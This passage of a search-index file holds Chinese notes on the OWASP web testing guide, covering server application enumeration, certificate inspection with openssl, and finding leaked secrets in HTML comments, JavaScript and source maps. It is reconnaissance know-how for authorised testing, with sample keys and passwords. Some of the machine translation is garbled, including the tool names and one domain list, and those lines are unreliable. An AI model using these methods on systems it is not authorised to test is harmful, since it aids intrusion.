\u540d\u79f0\u6761\u76ee\u3002\u6b64\u6280\u672f\u4f9d\u8d56\u4e8e IP \u5230\u7b26\u53f7\u540d\u79f0\u6620\u5c04\u7684\u5b58\u5728\uff0c\u4f46\u4e0d\u80fd\u4fdd\u8bc1\u8fd9\u4e00\u70b9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#web-dns","title":"\u57fa\u4e8e Web \u7684 DNS \u641c\u7d22","text":"<p>\u8fd9\u79cd\u641c\u7d22\u7c7b\u4f3c\u4e8e DNS \u533a\u57df\u4f20\u8f93\uff0c\u4f46\u4f9d\u8d56\u4e8e\u5728 DNS \u4e0a\u542f\u7528\u57fa\u4e8e\u540d\u79f0\u7684\u641c\u7d22\u7684\u57fa\u4e8e Web \u7684\u670d\u52a1\u3002\u5176\u4e2d\u4e00\u9879\u670d\u52a1\u662fNetcraft \u641c\u7d22 DNS\u670d\u52a1\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u67e5\u8be2\u5c5e\u4e8e\u60a8\u9009\u62e9\u7684\u57df\u7684\u540d\u79f0\u5217\u8868\uff0c\u4f8b\u5982<code>example.com</code>.\u00a0\u7136\u540e\u4ed6\u4eec\u5c06\u68c0\u67e5\u4ed6\u4eec\u83b7\u5f97\u7684\u540d\u79f0\u662f\u5426\u4e0e\u4ed6\u4eec\u6b63\u5728\u68c0\u67e5\u7684\u76ee\u6807\u76f8\u5173\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#ip","title":"\u53cd\u5411 IP \u670d\u52a1","text":"<p>\u53cd\u5411 IP \u670d\u52a1\u7c7b\u4f3c\u4e8e DNS \u53cd\u5411\u67e5\u8be2\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u6d4b\u8bd5\u4eba\u5458\u67e5\u8be2\u57fa\u4e8e Web \u7684\u5e94\u7528\u7a0b\u5e8f\u800c\u4e0d\u662f\u540d\u79f0\u670d\u52a1\u5668\u3002\u6709\u8bb8\u591a\u8fd9\u6837\u7684\u670d\u52a1\u53ef\u7528\u3002\u7531\u4e8e\u5b83\u4eec\u503e\u5411\u4e8e\u8fd4\u56de\u90e8\u5206\uff08\u5e76\u4e14\u901a\u5e38\u662f\u4e0d\u540c\u7684\uff09\u7ed3\u679c\uff0c\u56e0\u6b64\u6700\u597d\u4f7f\u7528\u591a\u79cd\u670d\u52a1\u6765\u83b7\u5f97\u66f4\u5168\u9762\u7684\u5206\u6790\u3002</p> <ul> <li>MxToolbox \u53cd\u5411 IP</li> <li>DNSstuff\uff08\u63d0\u4f9b\u591a\u79cd\u670d\u52a1\uff09</li> <li>Net Square\uff08\u57df\u540d\u548cIP\u5730\u5740\u7684\u591a\u6b21\u67e5\u8be2\uff0c\u9700\u8981\u5b89\u88c5\uff09</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_4","title":"\u8c37\u6b4c\u641c\u7d22","text":"<p>\u4ece\u4ee5\u524d\u7684\u6280\u672f\u6536\u96c6\u4fe1\u606f\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f9d\u9760\u641c\u7d22\u5f15\u64ce\u6765\u6539\u8fdb\u548c\u589e\u52a0\u4ed6\u4eec\u7684\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u4f1a\u4ea7\u751f\u5c5e\u4e8e\u76ee\u6807\u7684\u5176\u4ed6\u7b26\u53f7\u540d\u79f0\u7684\u8bc1\u636e\uff0c\u6216\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u660e\u663e\u7684 URL \u8bbf\u95ee\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u4f8b\u5982\uff0c\u8003\u8651\u524d\u9762\u5173\u4e8e \u7684\u793a\u4f8b<code>www.owasp.org</code>\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u67e5\u8be2 Google \u548c\u5176\u4ed6\u641c\u7d22\u5f15\u64ce\u4ee5\u67e5\u627e\u4e0e\u65b0\u53d1\u73b0\u7684\u57df \u3001 \u548c \u76f8\u5173\u7684\u4fe1\u606f\uff08\u56e0\u6b64\uff0cDNS<code>webgoat.org</code>\u540d\u79f0<code>webscarab.com</code>\uff09<code>webscarab.net</code>\u3002</p> <p>\u8c37\u6b4c\u641c\u7d22\u6280\u672f\u5728\u6d4b\u8bd5\uff1a\u8718\u86db\u3001\u673a\u5668\u4eba\u548c\u722c\u866b\u4e2d\u6709\u89e3\u91ca\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_5","title":"\u6570\u5b57\u8bc1\u4e66","text":"<p>\u5982\u679c\u670d\u52a1\u5668\u63a5\u53d7\u901a\u8fc7 HTTPS \u7684\u8fde\u63a5\uff0c\u5219\u8bc1\u4e66\u4e0a\u7684\u901a\u7528\u540d\u79f0 (CN) \u548c\u4e3b\u9898\u5907\u7528\u540d\u79f0 (SAN) \u53ef\u80fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u4e3b\u673a\u540d\u3002\u4f46\u662f\uff0c\u5982\u679c\u7f51\u7edc\u670d\u52a1\u5668\u6ca1\u6709\u53d7\u4fe1\u4efb\u7684\u8bc1\u4e66\uff0c\u6216\u8005\u6b63\u5728\u4f7f\u7528\u901a\u914d\u7b26\uff0c\u5219\u53ef\u80fd\u4e0d\u4f1a\u8fd4\u56de\u4efb\u4f55\u6709\u6548\u4fe1\u606f\u3002</p> <p>CN\u548cSAN\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u67e5\u770b\u8bc1\u4e66\u83b7\u53d6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7OpenSSL\u7b49\u5176\u4ed6\u5de5\u5177\u83b7\u53d6\uff1a</p> <pre><code>openssl s_client -connect 93.184.216.34:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.4%E6%9E%9A%E4%B8%BE%20Web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/#_6","title":"\u5de5\u5177","text":"<ul> <li><code>nslookup</code>DNS \u67e5\u627e\u5de5\u5177\uff0c\u4f8b\u5982<code>dig</code>\u548c\u7c7b\u4f3c\u7684\u5de5\u5177\u3002</li> <li>\u641c\u7d22\u5f15\u64ce\uff08Google\u3001Bing \u548c\u5176\u4ed6\u4e3b\u8981\u641c\u7d22\u5f15\u64ce\uff09\u3002</li> <li>\u4e13\u95e8\u7684 DNS \u76f8\u5173\u7684\u57fa\u4e8e Web \u7684\u641c\u7d22\u670d\u52a1\uff1a\u89c1\u6b63\u6587\u3002</li> <li>\u5730\u56fe</li> <li>Nessus \u6f0f\u6d1e\u626b\u63cf\u7a0b\u5e8f</li> <li>\u5c3c\u514b\u6258</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/","title":"1.5\u5ba1\u67e5\u7f51\u9875\u5185\u5bb9\u662f\u5426\u5b58\u5728\u4fe1\u606f\u6cc4\u9732","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_1","title":"\u6982\u62ec","text":"<p>\u7a0b\u5e8f\u5458\u5728\u4ed6\u4eec\u7684\u6e90\u4ee3\u7801\u4e2d\u5305\u542b\u8be6\u7ec6\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u662f\u5f88\u5e38\u89c1\u7684\uff0c\u751a\u81f3\u662f\u88ab\u63a8\u8350\u7684\u3002\u4f46\u662f\uff0cHTML \u4ee3\u7801\u4e2d\u5305\u542b\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u53ef\u80fd\u4f1a\u6cc4\u9732\u6f5c\u5728\u653b\u51fb\u8005\u4e0d\u5e94\u83b7\u5f97\u7684\u5185\u90e8\u4fe1\u606f\u3002\u5e94\u8be5\u8fdb\u884c\u8bc4\u8bba\u548c\u5143\u6570\u636e\u5ba1\u67e5\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u4fe1\u606f\u88ab\u6cc4\u9732\u3002\u6b64\u5916\uff0c\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5728\u91cd\u5b9a\u5411\u54cd\u5e94\u6b63\u6587\u4e2d\u6cc4\u9732\u4fe1\u606f\u3002</p> <p>\u5bf9\u4e8e\u73b0\u4ee3\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0c\u524d\u7aef\u4f7f\u7528\u5ba2\u6237\u7aef JavaScript \u53d8\u5f97\u8d8a\u6765\u8d8a\u6d41\u884c\u3002\u6d41\u884c\u7684\u524d\u7aef\u6784\u5efa\u6280\u672f\u4f7f\u7528\u5ba2\u6237\u7aef JavaScript\uff0c\u5982 ReactJS\u3001AngularJS \u6216 Vue\u3002\u4e0e HTML \u4ee3\u7801\u4e2d\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u7c7b\u4f3c\uff0c\u8bb8\u591a\u7a0b\u5e8f\u5458\u4e5f\u5c06\u654f\u611f\u4fe1\u606f\u786c\u7f16\u7801\u5728\u524d\u7aef\u7684 JavaScript \u53d8\u91cf\u4e2d\u3002\u654f\u611f\u4fe1\u606f\u53ef\u4ee5\u5305\u62ec\uff08\u4f46\u4e0d\u9650\u4e8e\uff09\uff1a\u79c1\u6709 API \u5bc6\u94a5\uff08_\u4f8b\u5982_\u4e0d\u53d7\u9650\u5236\u7684 Google Map API \u5bc6\u94a5\uff09\u3001\u5185\u90e8 IP \u5730\u5740\u3001\u654f\u611f\u8def\u7531\uff08_\u4f8b\u5982_\u5230\u9690\u85cf\u7ba1\u7406\u9875\u9762\u6216\u529f\u80fd\u7684\u8def\u7531\uff09\uff0c\u751a\u81f3\u51ed\u636e\u3002\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u53ef\u80fd\u4f1a\u4ece\u6b64\u7c7b\u524d\u7aef JavaScript \u4ee3\u7801\u4e2d\u6cc4\u9732\u3002\u5e94\u8fdb\u884c\u5ba1\u67e5\uff0c\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u6cc4\u9732\uff0c\u53ef\u80fd\u88ab\u653b\u51fb\u8005\u6ee5\u7528\u3002</p> <p>\u5bf9\u4e8e\u5927\u578b\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0c\u6027\u80fd\u95ee\u9898\u662f\u7a0b\u5e8f\u5458\u975e\u5e38\u5173\u5fc3\u7684\u95ee\u9898\u3002\u7a0b\u5e8f\u5458\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u4f18\u5316\u524d\u7aef\u6027\u80fd\uff0c\u5305\u62ec Syntactically Awesome Style Sheets (SASS)\u3001Sassy CSS (SCSS)\u3001webpack \u7b49\u3002\u4f7f\u7528\u8fd9\u4e9b\u6280\u672f\uff0c\u524d\u7aef\u4ee3\u7801\u6709\u65f6\u4f1a\u53d8\u5f97\u66f4\u96be\u7406\u89e3\u548c\u96be\u4ee5\u8c03\u8bd5\uff0c\u6b63\u56e0\u4e3a\u5982\u6b64\uff0c\u7a0b\u5e8f\u5458\u7ecf\u5e38\u90e8\u7f72\u6e90\u6620\u5c04\u6587\u4ef6\u4ee5\u8fdb\u884c\u8c03\u8bd5\u3002\u201c\u6e90\u5730\u56fe\u201d\u662f\u4e00\u79cd\u7279\u6b8a\u6587\u4ef6\uff0c\u5b83\u5c06\u8d44\u4ea7\uff08CSS \u6216 JavaScript\uff09\u7684\u7f29\u5c0f/\u4e11\u5316\u7248\u672c\u8fde\u63a5\u5230\u539f\u59cb\u521b\u4f5c\u7248\u672c\u3002\u7a0b\u5e8f\u5458\u4ecd\u5728\u4e89\u8bba\u662f\u5426\u5c06\u6e90\u6620\u5c04\u6587\u4ef6\u5e26\u5230\u751f\u4ea7\u73af\u5883\u4e2d\u3002\u4f46\u662f\uff0c\u4e0d\u53ef\u5426\u8ba4\u7684\u662f\uff0c\u5982\u679c\u5c06\u6e90\u6620\u5c04\u6587\u4ef6\u6216\u7528\u4e8e\u8c03\u8bd5\u7684\u6587\u4ef6\u53d1\u5e03\u5230\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5c06\u4f7f\u5b83\u4eec\u7684\u6e90\u4ee3\u7801\u66f4\u5177\u53ef\u8bfb\u6027\u3002\u5b83\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u4ece\u524d\u7aef\u53d1\u73b0\u6f0f\u6d1e\u6216\u4ece\u4e2d\u6536\u96c6\u654f\u611f\u4fe1\u606f\u3002\u5e94\u8be5\u8fdb\u884c JavaScript \u4ee3\u7801\u5ba1\u67e5\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u8c03\u8bd5\u6587\u4ef6\u4ece\u524d\u7aef\u516c\u5f00\u3002\u6839\u636e\u9879\u76ee\u7684\u4e0a\u4e0b\u6587\u548c\u654f\u611f\u6027\uff0c\u5b89\u5168\u4e13\u5bb6\u5e94\u51b3\u5b9a\u6587\u4ef6\u662f\u5426\u5e94\u5b58\u5728\u4e8e\u751f\u4ea7\u73af\u5883\u4e2d\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u67e5\u770b\u7f51\u9875\u8bc4\u8bba\u3001\u5143\u6570\u636e\u548c\u91cd\u5b9a\u5411\u6b63\u6587\u4ee5\u53d1\u73b0\u4efb\u4f55\u4fe1\u606f\u6cc4\u6f0f\u3002</li> <li>\u6536\u96c6 JavaScript \u6587\u4ef6\u5e76\u67e5\u770b JS \u4ee3\u7801\uff0c\u4ee5\u66f4\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u5e76\u67e5\u627e\u4efb\u4f55\u4fe1\u606f\u6cc4\u6f0f\u3002</li> <li>\u786e\u5b9a\u6e90\u6620\u5c04\u6587\u4ef6\u6216\u5176\u4ed6\u524d\u7aef\u8c03\u8bd5\u6587\u4ef6\u662f\u5426\u5b58\u5728\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_4","title":"\u67e5\u770b\u7f51\u9875\u8bc4\u8bba\u548c\u5143\u6570\u636e","text":"<p>\u5f00\u53d1\u4eba\u5458\u7ecf\u5e38\u4f7f\u7528 HTML \u6ce8\u91ca\u6765\u5305\u542b\u6709\u5173\u5e94\u7528\u7a0b\u5e8f\u7684\u8c03\u8bd5\u4fe1\u606f\u3002\u6709\u65f6\uff0c\u4ed6\u4eec\u4f1a\u5fd8\u8bb0\u8bc4\u8bba\u5e76\u5c06\u5176\u7559\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u3002\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u5bfb\u627e\u4ee5 \u5f00\u5934\u7684 HTML \u6ce8\u91ca<code>&lt;!--</code>\u3002</p> <p>\u68c0\u67e5 HTML \u6e90\u4ee3\u7801\u4e2d\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u6ce8\u91ca\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u66f4\u6df1\u5165\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u53ef\u80fd\u662f SQL \u4ee3\u7801\u3001\u7528\u6237\u540d\u548c\u5bc6\u7801\u3001\u5185\u90e8 IP \u5730\u5740\u6216\u8c03\u8bd5\u4fe1\u606f\u3002</p> <pre><code>...\n&lt;div class=\"table2\"&gt;\n  &lt;div class=\"col1\"&gt;1&lt;/div&gt;&lt;div class=\"col2\"&gt;Mary&lt;/div&gt;\n  &lt;div class=\"col1\"&gt;2&lt;/div&gt;&lt;div class=\"col2\"&gt;Peter&lt;/div&gt;\n  &lt;div class=\"col1\"&gt;3&lt;/div&gt;&lt;div class=\"col2\"&gt;Joe&lt;/div&gt;\n\n&lt;!-- Query: SELECT id, name FROM app.users WHERE active='1' --&gt;\n\n&lt;/div&gt;\n...\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u751a\u81f3\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u6837\u7684\u4e1c\u897f\uff1a</p> <pre><code>&lt;!-- Use the DB administrator password for testing:  f@keP@a$$w0rD --&gt;\n</code></pre> <p>\u68c0\u67e5 HTML \u7248\u672c\u4fe1\u606f\u4ee5\u83b7\u53d6\u6709\u6548\u7684\u7248\u672c\u53f7\u548c\u6570\u636e\u7c7b\u578b\u5b9a\u4e49 (DTD) URL</p> <pre><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n</code></pre> <ul> <li><code>strict.dtd</code>\u2013 \u9ed8\u8ba4\u4e25\u683c DTD</li> <li><code>loose.dtd</code>\u2013 \u5bbd\u677e\u7684 DTD</li> <li><code>frameset.dtd</code>\u2013 \u6846\u67b6\u96c6\u6587\u6863\u7684 DTD</li> </ul> <p>\u6709\u4e9b<code>META</code>\u6807\u7b7e\u4e0d\u63d0\u4f9b\u4e3b\u52a8\u653b\u51fb\u5411\u91cf\uff0c\u800c\u662f\u5141\u8bb8\u653b\u51fb\u8005\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\uff1a</p> <pre><code>&lt;META name=\"Author\" content=\"Andrew Muller\"&gt;\n</code></pre> <p>\u4e00\u4e2a\u5e38\u89c1\u7684\uff08\u4f46\u4e0d\u7b26\u5408WCAG\uff09<code>META</code>\u6807\u7b7e\u662fRefresh\u3002</p> <pre><code>&lt;META http-equiv=\"Refresh\" content=\"15;URL=https://www.owasp.org/index.html\"&gt;\n</code></pre> <p>\u6807\u7b7e\u7684\u4e00\u4e2a\u5e38\u89c1\u7528\u9014<code>META</code>\u662f\u6307\u5b9a\u641c\u7d22\u5f15\u64ce\u53ef\u4ee5\u7528\u6765\u63d0\u9ad8\u641c\u7d22\u7ed3\u679c\u8d28\u91cf\u7684\u5173\u952e\u5b57\u3002</p> <pre><code>&lt;META name=\"keywords\" lang=\"en-us\" content=\"OWASP, security, sunshine, lollipops\"&gt;\n</code></pre> <p>\u867d\u7136\u5927\u591a\u6570\u7f51\u7edc\u670d\u52a1\u5668\u901a\u8fc7\u6587\u4ef6\u6765\u7ba1\u7406\u641c\u7d22\u5f15\u64ce\u7d22\u5f15<code>robots.txt</code>\uff0c\u4f46\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>META</code>\u6807\u7b7e\u6765\u7ba1\u7406\u3002\u4e0b\u9762\u7684\u6807\u7b7e\u5c06\u5efa\u8bae\u673a\u5668\u4eba\u4e0d\u8981\u7f16\u5236\u7d22\u5f15\uff0c\u4e5f\u4e0d\u8981\u8ddf\u8e2a\u5305\u542b\u8be5\u6807\u7b7e\u7684 HTML \u9875\u9762\u4e0a\u7684\u94fe\u63a5\u3002</p> <pre><code>&lt;META name=\"robots\" content=\"none\"&gt;\n</code></pre> <p>\u4e92\u8054\u7f51\u5185\u5bb9\u9009\u62e9\u5e73\u53f0 (PICS)\u548c\u7f51\u7edc\u63cf\u8ff0\u8d44\u6e90\u534f\u8bae (POWDER)\u63d0\u4f9b\u4e86\u5c06\u5143\u6570\u636e\u4e0e\u4e92\u8054\u7f51\u5185\u5bb9\u76f8\u5173\u8054\u7684\u57fa\u7840\u8bbe\u65bd\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#javascript-javascript","title":"\u8bc6\u522b JavaScript \u4ee3\u7801\u5e76\u6536\u96c6 JavaScript \u6587\u4ef6","text":"<p>\u7a0b\u5e8f\u5458\u7ecf\u5e38\u5728\u524d\u7aef\u4f7f\u7528 JavaScript \u53d8\u91cf\u5bf9\u654f\u611f\u4fe1\u606f\u8fdb\u884c\u786c\u7f16\u7801\u3002<code>&lt;script&gt;</code>\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u68c0\u67e5 HTML \u6e90\u4ee3\u7801\u5e76\u5728\u548c\u6807\u8bb0\u4e4b\u95f4\u5bfb\u627e JavaScript \u4ee3\u7801<code>&lt;/script&gt;</code>\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u8bc6\u522b\u5916\u90e8 JavaScript \u6587\u4ef6\u4ee5\u5ba1\u67e5\u4ee3\u7801\uff08JavaScript \u6587\u4ef6\u7684\u6587\u4ef6\u6269\u5c55\u540d<code>.js</code>\u548c JavaScript \u6587\u4ef6\u7684\u540d\u79f0\u901a\u5e38\u653e\u5728\u6807\u7b7e\u7684<code>src</code>(source) \u5c5e\u6027\u4e2d\uff09\u3002<code>&lt;script&gt;</code></p> <p>\u68c0\u67e5 JavaScript \u4ee3\u7801\u662f\u5426\u5b58\u5728\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u6cc4\u6f0f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u4e00\u6b65\u6ee5\u7528\u6216\u64cd\u7eb5\u7cfb\u7edf\u3002\u67e5\u627e\u4ee5\u4e0b\u503c\uff1aAPI \u5bc6\u94a5\u3001\u5185\u90e8 IP \u5730\u5740\u3001\u654f\u611f\u8def\u7531\u6216\u51ed\u636e\u3002\u4f8b\u5982\uff1a</p> <pre><code>const myS3Credentials = {\n  accessKeyId: config('AWSS3AccessKeyID'),\n  secretAcccessKey: config('AWSS3SecretAccessKey'),\n};\n</code></pre> <p>\u6d4b\u8bd5\u4eba\u5458\u751a\u81f3\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u6837\u7684\u4e1c\u897f\uff1a</p> <pre><code>var conString = \"tcp://postgres:1234@localhost/postgres\";\n</code></pre> <p>\u627e\u5230 API \u5bc6\u94a5\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u68c0\u67e5 API \u5bc6\u94a5\u9650\u5236\u662f\u6309\u670d\u52a1\u8bbe\u7f6e\u7684\uff0c\u8fd8\u662f\u6309 IP\u3001HTTP \u5f15\u8350\u6765\u6e90\u7f51\u5740\u3001\u5e94\u7528\u7a0b\u5e8f\u3001SDK \u7b49\u8bbe\u7f6e\u7684\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u627e\u5230 Google Map API \u5bc6\u94a5\uff0c\u4ed6\u4eec\u53ef\u4ee5\u68c0\u67e5\u6b64 API \u5bc6\u94a5\u662f\u53d7 IP \u9650\u5236\u8fd8\u662f\u4ec5\u53d7 Google Map API \u9650\u5236\u3002\u5982\u679c Google API Key \u4ec5\u6839\u636e Google Map API \u53d7\u5230\u9650\u5236\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u8be5 API Key \u67e5\u8be2\u4e0d\u53d7\u9650\u5236\u7684 Google Map API\uff0c\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u5fc5\u987b\u4e3a\u6b64\u4ed8\u8d39\u3002</p> <pre><code>\n&lt;script type=\"application/json\"&gt;\n...\n{\"GOOGLE_MAP_API_KEY\":\"AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4\", \"RECAPTCHA_KEY\":\"6LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0\"}\n...\n&lt;/script&gt;\n</code></pre> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u4ece JavaScript \u4ee3\u7801\u4e2d\u627e\u5230\u654f\u611f\u8def\u5f84\uff0c\u4f8b\u5982\u6307\u5411\u5185\u90e8\u6216\u9690\u85cf\u7ba1\u7406\u9875\u9762\u7684\u94fe\u63a5\u3002</p> <pre><code>&lt;script type=\"application/json\"&gt;\n...\n\"runtimeConfig\":{\"BASE_URL_VOUCHER_API\":\"https://staging-voucher.victim.net/api\", \"BASE_BACKOFFICE_API\":\"https://10.10.10.2/api\", \"ADMIN_PAGE\":\"/hidden_administrator\"}\n...\n&lt;/script&gt;\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_5","title":"\u8bc6\u522b\u6e90\u6620\u5c04\u6587\u4ef6","text":"<p>\u6e90\u6620\u5c04\u6587\u4ef6\u901a\u5e38\u4f1a\u5728 DevTools \u6253\u5f00\u65f6\u52a0\u8f7d\u3002\u6d4b\u8bd5\u4eba\u5458\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5728\u6bcf\u4e2a\u5916\u90e8 JavaScript \u6587\u4ef6\u7684\u6269\u5c55\u540d\u540e\u6dfb\u52a0\u201c.map\u201d\u6269\u5c55\u540d\u6765\u67e5\u627e\u6e90\u6620\u5c04\u6587\u4ef6\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u770b\u5230\u4e00\u4e2a<code>/static/js/main.chunk.js</code>\u6587\u4ef6\uff0c\u4ed6\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee<code>/static/js/main.chunk.js.map</code>.</p> <p>\u68c0\u67e5\u6e90\u6620\u5c04\u6587\u4ef6\u4e2d\u662f\u5426\u6709\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u66f4\u6df1\u5165\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u3002\u4f8b\u5982\uff1a</p> <pre><code>{\n  \"version\": 3,\n  \"file\": \"static/js/main.chunk.js\",\n  \"sources\": [\n    \"/home/sysadmin/cashsystem/src/actions/index.js\",\n    \"/home/sysadmin/cashsystem/src/actions/reportAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/cashoutAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/userAction.js\",\n    \"...\"\n  ],\n  \"...\"\n}\n</code></pre> 